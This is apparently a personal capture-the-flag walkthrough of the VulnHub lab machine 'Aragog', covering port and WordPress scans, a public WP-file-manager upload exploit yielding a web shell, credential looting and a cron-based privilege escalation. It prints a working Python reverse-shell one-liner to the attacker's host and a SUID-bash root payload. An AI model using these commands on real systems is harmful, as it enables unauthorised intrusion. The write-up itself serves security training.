# BOX NAME: Aragog
**LINK**: https://www.vulnhub.com/entry/harrypotter-aragog-102,688/

<details open><summary><ins>SUMMARY</ins></summary>

```
1. Enumerate webserver to gain a web-shell
2. Use public exploit.
3. Enumerate local box to find DB credentials. No standard WP-settings in this one.
4. Exploit a forgotten hidden script being executed via cron.
5. Grab a root shell. BOOM!

Quite intuitive. took me a while to figure out the hidden credentials when I'm so dead-set on wp-exploitation basics.
```
</details>

# REMOTE ENUMERATION:

<details><summary><ins>TARGET</ins></summary>

```
[+] IP:		10.77.0.80
[+] URL:	http://aragog.hogwarts
			http://wordpress.aragog.hogwarts
```
</details>
<details><summary><ins>NMAP</ins></summary>

```
└─$ nmap -sV -sC aragog.com -oN nmap-aragog.log
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-11 20:26 CEST
Nmap scan report for aragog.com (10.77.0.80)
Host is up (0.00068s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 48df48372594c4746b2c6273bfb49fa9 (RSA)
|   256 1e3418175e17958f702f80a6d5b4173e (ECDSA)
|_  256 3e795f55553b127596b43ee3837a5494 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.66 seconds
```
</details>
<details><summary><ins>WEB</ins></summary>

whatweb-scan
```
http://aragog.com [200 OK] Apache[2.4.38], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[10.77.0.80]
```

nikto-scan
```
└─$ nikto -h http://aragog.com
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.77.0.80
+ Target Hostname:    aragog.com
+ Target Port:        80
+ Start Time:         2023-06-11 20:26:31 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.38 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.38 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Server may leak inodes via ETags, header found with file /, inode: 61, size: 5bee8467b5fd6, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ OPTIONS: Allowed HTTP Methods: OPTIONS, HEAD, GET, POST .
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /blog/wp-login.php: Cookie wordpress_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /blog/wp-login.php: Wordpress login found.
+ 7962 requests: 0 error(s) and 8 item(s) reported on remote host
+ End Time:           2023-06-11 20:26:58 (GMT2) (27 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

fuzzing
```
icons                   [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 0ms]
javascript              [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 1ms]
blog                    [Status: 200, Size: 13918, Words: 650, Lines: 148, Duration: 586ms]
server-status           [Status: 403, Size: 275, Words: 20, Lines: 10, Duration: 7ms]
```
other
```
└─$ cat wpscan-aragog.log 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://wordpress.aragog.hogwarts/blog/ [10.77.0.80]
[+] Started: Sun Jun 11 20:34:58 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.38 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://wordpress.aragog.hogwarts/blog/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://wordpress.aragog.hogwarts/blog/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://wordpress.aragog.hogwarts/blog/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.0.12 identified (Insecure, released on 2021-04-14).
 | Found By: Rss Generator (Passive Detection)
 |  - http://wordpress.aragog.hogwarts/blog/?feed=rss2, <generator>https://wordpress.org/?v=5.0.12</generator>
 |  - http://wordpress.aragog.hogwarts/blog/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.0.12</generator>

[+] WordPress theme in use: twentynineteen
 | Location: http://wordpress.aragog.hogwarts/blog/wp-content/themes/twentynineteen/
 | Last Updated: 2023-03-29T00:00:00.000Z
 | Readme: http://wordpress.aragog.hogwarts/blog/wp-content/themes/twentynineteen/readme.txt
 | [!] The version is out of date, the latest version is 2.5
 | Style URL: http://wordpress.aragog.hogwarts/blog/wp-content/themes/twentynineteen/style.css?ver=1.2
 | Style Name: Twenty Nineteen
 | Style URI: https://github.com/WordPress/twentynineteen
 | Description: Our 2019 default theme is designed to show off the power of the block editor. It features custom sty...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://wordpress.aragog.hogwarts/blog/wp-content/themes/twentynineteen/style.css?ver=1.2, Match: 'Version: 1.2'


[i] No plugins Found.


[i] User(s) Identified:

[+] WP-Admin
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By: Rss Generator (Passive Detection)

[+] wp-admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Jun 11 20:35:01 2023
[+] Requests Done: 54
[+] Cached Requests: 6
[+] Data Sent: 15.136 KB
[+] Data Received: 320.065 KB
[+] Memory used: 244.809 MB
[+] Elapsed time: 00:00:02
```

</details>

<details><summary><ins>SERVICES</ins></summary>

FTP
```

```

SSH
```
SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
```

SNMP
```

```

DNS
```

```

MAILSERVICES (POP, IMAP, SMTP)
```

```

LDAP
```

```

</details>

<details><summary><ins>Active Directory</ins></summary>

Active Directory
```

```
</details>

<details><summary><ins>SUMMARY REMOTE</ins></summary>

```
1. Find a vulnerable plugin.
2. Initiate the public exploit to upload a web-shell. (way to easy)

after you've run the python exploit. 
Just navigate to "http://wordpress.aragog.hogwarts/blog/wp-content/plugins/wp-file-manager/lib/files/shell.php?cmd=ls%20-al"
and you're golden.


└─$ SC wp-file-manager        
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
WP-file-manager v6.9 - Unauthenticated Arbitrary File Upload leading to RCE       | php/webapps/51224.py
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

Rev-shell with:
/usr/bin/python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.77.0.35",6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

and BAM.
```
</details>

# LOCAL ENUMERATION:

<details><summary><ins>FILES OF INTEREST</ins></summary>

**FILES**:
```
/opt/.backup.sh
/home/hagrid/horcrux1.txt
```

**SUID's**:

```
www-data@Aragog:/usr/share/wordpress$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/mount
/usr/bin/su
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/umount
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
```
**SGID's**:

```
www-data@Aragog:/opt$ find / -perm -g=s -type f 2>/dev/null
/usr/sbin/unix_chkpwd
/usr/bin/ssh-agent
/usr/bin/chage
/usr/bin/bsd-write
/usr/bin/wall
/usr/bin/expiry
/usr/bin/crontab
```
**OTHERS**:

```

```
</details>


# LOOT

<details><summary><ins>USEFUL INFORMATION:</ins></summary>

**Kernel Info:**
*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*
```
/bin/bash: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=ffe165dc81a64aea2b05beda07aeda8ad71f1e7c, stripped
 

No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 10 (buster)
Release:        10
Codename:       buster


Linux Aragog 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux
```
</details>

<details><summary><ins>CREDS:</ins></summary>

```
username:password




www-data@Aragog:/usr/share/wordpress$ cat /etc/wordpress/config-default.php
<?php
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'mySecr3tPass');
define('DB_HOST', 'localhost');
define('DB_COLLATE', 'utf8_general_ci');
define('WP_CONTENT_DIR', '/usr/share/wordpress/wp-content');
?>


+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email               | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | hagrid98   | $P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc. | wp-admin      | hagrid98@localhost.local |          | 2021-03-31 14:21:02 |                     |           0 | WP-Admin     |
+----+------------+------------------------------------+---------------+--------------------------+----------+---------------------+---------------------+-------------+--------------+

```
</details>

<details><summary><ins>HASHES:</ins></summary>

```
$P$BYdTic1NGSb8hJbpVEMiJaAiNJDHtc. : password123
```
</details>

# PROOFS

<details><summary><ins>Proofs</ins></summary>

Final payload:
```
cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash

```

```
horcrux1:horcrux_{MTogUmlkRGxFJ3MgRGlBcnkgZEVzdHJvWWVkIEJ5IGhhUnJ5IGluIGNoYU1iRXIgb2YgU2VDcmV0cw==}
--> 1: RidDlE's DiAry dEstroYed By haRry in chaMbEr of SeCrets
```

```
hagrid98@Aragog:/tmp$ ./rootbash -p
rootbash-5.0# id
uid=1000(hagrid98) gid=1000(hagrid98) euid=0(root) egid=0(root) groups=0(root),1000(hagrid98)
rootbash-5.0# 



rootbash-5.0# cat horcrux2.txt 
  ____                            _         _       _   _                 
 / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_(_) ___  _ __  ___ 
| |   / _ \| '_ \ / _` | '__/ _` | __| | | | |/ _` | __| |/ _ \| '_ \/ __|
| |__| (_) | | | | (_| | | | (_| | |_| |_| | | (_| | |_| | (_) | | | \__ \
 \____\___/|_| |_|\__, |_|  \__,_|\__|\__,_|_|\__,_|\__|_|\___/|_| |_|___/
                  |___/                                                   


Machine Author: Mansoor R (@time4ster)
Machine Difficulty: Easy
Machine Name: Aragog 
Horcruxes Hidden in this VM: 2 horcruxes

You have successfully pwned Aragog machine.
Here is your second hocrux: horcrux_{MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWVkIGJZIERVbWJsZWRPcmU=}
--> 2: maRvoLo GaUnt's riNg deStrOyed bY DUmbledOre



# For any queries/suggestions feel free to ping me at email: time4ster@protonmail.com

```

</details>